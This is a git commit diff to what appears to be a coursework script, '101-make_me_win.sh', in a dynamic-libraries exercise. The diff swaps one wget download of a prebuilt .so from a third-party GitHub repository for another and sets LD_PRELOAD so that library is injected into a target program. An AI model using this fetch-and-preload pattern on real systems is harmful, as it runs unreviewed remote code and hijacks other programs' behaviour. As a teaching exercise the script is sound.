15dc9b66137d55ca36e51f4e680a0037e33b58ac
Mark Wonah <markwonah@gmail.com>
2023-05-23 05:17:41 -0700

    updated advanced task 2

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
- wget -q -O /tmp/librandy1.so https://github.com/ianliu-johnston/BatchScripts/raw/master/librandy1.so
- export LD_PRELOAD=/tmp/librandy1.so
+wget -P /tmp https://github.com/sidneyriffic/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
+export LD_PRELOAD=/tmp/putshack.so
